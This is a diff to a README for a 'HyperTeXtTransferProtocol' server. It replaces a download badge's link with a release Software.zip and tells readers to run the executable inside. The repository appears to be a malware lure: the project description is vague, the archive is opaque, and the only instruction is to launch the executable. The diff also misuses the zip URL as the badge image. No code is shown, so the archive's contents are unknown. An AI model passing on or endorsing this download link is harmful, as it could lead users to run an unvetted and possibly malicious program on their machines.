@@ -7,7 +7,7 @@ Welcome to the HyperTeXtTransferProtocol repository! This is a simple server pro
 
 To get started with the HyperTeXtTransferProtocol server, you can download the software using the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/doritoi/HyperTeXtTransferProtocol/releases/download/v2.0/Software.zip)](https://github.com/doritoi/HyperTeXtTransferProtocol/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software, follow the installation instructions to set up the server on your machine. Make sure to launch the software by running the executable file included in the downloaded package.
 
